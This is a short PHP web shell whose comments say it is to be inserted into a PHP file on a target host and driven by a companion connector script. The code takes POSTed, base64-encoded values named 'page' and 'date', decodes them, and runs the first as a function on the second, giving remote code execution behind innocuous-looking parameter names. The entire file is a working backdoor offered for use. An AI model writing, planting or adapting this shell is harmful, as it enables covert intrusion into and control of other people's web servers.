<?php
// I put these codes into different lines of a php file on the target host.
// to use, web_shell_connector.py can be used.
@extract ($_POST);
$p = base64_decode($page);
$d = base64_decode($date);
@die ($p($d));
?>